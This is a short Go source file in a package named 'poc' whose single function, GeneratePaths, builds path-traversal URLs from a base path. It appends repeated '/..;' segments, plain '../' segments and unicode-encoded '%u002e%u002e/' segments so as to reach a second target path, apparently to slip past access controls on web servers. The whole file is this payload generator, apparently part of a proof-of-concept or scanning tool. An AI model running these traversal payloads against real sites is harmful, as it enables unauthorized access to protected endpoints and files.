package poc

import (
	"strings"
)

func GeneratePaths(baseURL, baseURL2 string) []string {
	depth := strings.Count(baseURL, "/")

	var paths []string

	var sb1 strings.Builder
	for i := 0; i < depth; i++ {
		sb1.WriteString("/..;")
	}
	sb1.WriteString(baseURL2) // 确保以 / 开头
	paths = append(paths, baseURL+sb1.String())

	var sb2 strings.Builder
	for i := 0; i < depth; i++ {
		sb2.WriteString("../")
	}
	sb2.WriteString(baseURL2[1:])
	paths = append(paths, baseURL+"/"+sb2.String())

	var sb3 strings.Builder
	for i := 0; i < depth; i++ {
		sb3.WriteString("%u002e%u002e/")
	}
	sb3.WriteString(baseURL2[1:])
	paths = append(paths, baseURL+"/"+sb3.String())

	return paths
}
